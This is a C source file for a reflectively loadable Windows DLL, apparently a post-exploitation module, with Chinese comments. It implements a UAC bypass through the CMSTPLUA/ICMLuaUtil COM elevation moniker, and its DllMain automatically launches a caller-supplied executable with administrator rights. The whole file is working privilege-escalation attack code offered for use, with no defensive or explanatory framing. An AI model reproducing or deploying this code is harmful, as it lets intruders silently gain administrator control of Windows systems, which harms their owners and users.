//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//
#include "ReflectiveLoader.h"

#include<stdio.h>

#include <Windows.h>
#include <objbase.h>
#include <strsafe.h>


#define CLSID_CMSTPLUA                     L"{3E5FC7F9-9A51-4367-9063-A120244FBEC7}"
#define IID_ICMLuaUtil                     L"{6EDD6D74-C007-4E75-B76A-E5740995E24C}"


typedef interface ICMLuaUtil ICMLuaUtil;

typedef struct ICMLuaUtilVtbl {

	BEGIN_INTERFACE

		HRESULT(STDMETHODCALLTYPE* QueryInterface)(
			__RPC__in ICMLuaUtil* This,
			__RPC__in REFIID riid,
			_COM_Outptr_  void** ppvObject);

	ULONG(STDMETHODCALLTYPE* AddRef)(
		__RPC__in ICMLuaUtil* This);

	ULONG(STDMETHODCALLTYPE* Release)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method1)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method2)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method3)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method4)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method5)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method6)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* ShellExec)(
		__RPC__in ICMLuaUtil* This,
		_In_     LPCWSTR lpFile,
		_In_opt_  LPCTSTR lpParameters,
		_In_opt_  LPCTSTR lpDirectory,
		_In_      ULONG fMask,
		_In_      ULONG nShow
		);

	HRESULT(STDMETHODCALLTYPE* SetRegistryStringValue)(
		__RPC__in ICMLuaUtil* This,
		_In_      HKEY hKey,
		_In_opt_  LPCTSTR lpSubKey,
		_In_opt_  LPCTSTR lpValueName,
		_In_      LPCTSTR lpValueString
		);

	HRESULT(STDMETHODCALLTYPE* Method9)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method10)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method11)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method12)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method13)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method14)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method15)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method16)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method17)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method18)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method19)(
		__RPC__in ICMLuaUtil* This);

	HRESULT(STDMETHODCALLTYPE* Method20)(
		__RPC__in ICMLuaUtil* This);

	END_INTERFACE

} *PICMLuaUtilVtbl;

interface ICMLuaUtil
{
	CONST_VTBL struct ICMLuaUtilVtbl* lpVtbl;
};


HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid);

BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable);


HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID* ppVoid)
{
	BIND_OPTS3 bo;
	WCHAR wszCLSID[MAX_PATH] = { 0 };
	WCHAR wszMonikerName[MAX_PATH] = { 0 };
	HRESULT hr = 0;

	// 初始化COM环境
	CoInitialize(NULL);

	// 构造字符串
	StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0])));
	hr = StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), L"Elevation:Administrator!new:%s", wszCLSID);
	if (FAILED(hr))
	{
		return hr;
	}

	// 设置BIND_OPTS3
	RtlZeroMemory(&bo, sizeof(bo));
	bo.cbStruct = sizeof(bo);
	bo.hwnd = hWnd;
	bo.dwClassContext = CLSCTX_LOCAL_SERVER;

	// 创建名称对象并获取COM对象
	hr = CoGetObject(wszMonikerName, &bo, riid, ppVoid);
	return hr;
}


BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable)
{
	HRESULT hr = 0;
	CLSID clsidICMLuaUtil = { 0 };
	IID iidICMLuaUtil = { 0 };
	ICMLuaUtil* CMLuaUtil = NULL;
	BOOL bRet = FALSE;

	do {
		CLSIDFromString(CLSID_CMSTPLUA, &clsidICMLuaUtil);
		IIDFromString(IID_ICMLuaUtil, &iidICMLuaUtil);

		// 提权

#ifdef _WIN64
		hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil,  iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
#else 
		hr = CoCreateInstanceAsAdmin(NULL, (const IID*)&clsidICMLuaUtil, (CONST IID*) & iidICMLuaUtil, (PVOID*)(&CMLuaUtil));
#endif 

		
		if (FAILED(hr))
		{
			break;
		}

		// 启动程序
		hr = CMLuaUtil->lpVtbl->ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW);
		if (FAILED(hr))
		{
			break;
		}

		bRet = TRUE;
	} while (FALSE);

	// 释放
	if (CMLuaUtil)
	{
		CMLuaUtil->lpVtbl->Release(CMLuaUtil);
	}

	return bRet;
}
// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;
//===============================================================================================//
BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )
{
	WCHAR wszPath[MAX_PATH] ;
    BOOL bReturnValue = TRUE;
	switch( dwReason ) 
    { 
		case DLL_QUERY_HMODULE:
			if( lpReserved != NULL )
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hinstDLL;
			printf("Running.....%s\n", lpReserved);
#ifdef _WIN64
			MultiByteToWideChar(CP_ACP, 0, (LPCCH)lpReserved, strlen((const char*)lpReserved), wszPath, sizeof(wszPath) / sizeof(wszPath[0]));
#else 
			MultiByteToWideChar(CP_ACP, 0, lpReserved, strlen(lpReserved), wszPath, sizeof(wszPath) / sizeof(wszPath[0]));
#endif
			
			CMLuaUtilBypassUAC(wszPath);
			
            /* flush STDOUT */
            fflush(stdout);
			
            /* we're done, so let's exit */
            ExitProcess(0);
			break;
		case DLL_PROCESS_DETACH:
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
            break;
    }
	return bReturnValue;
}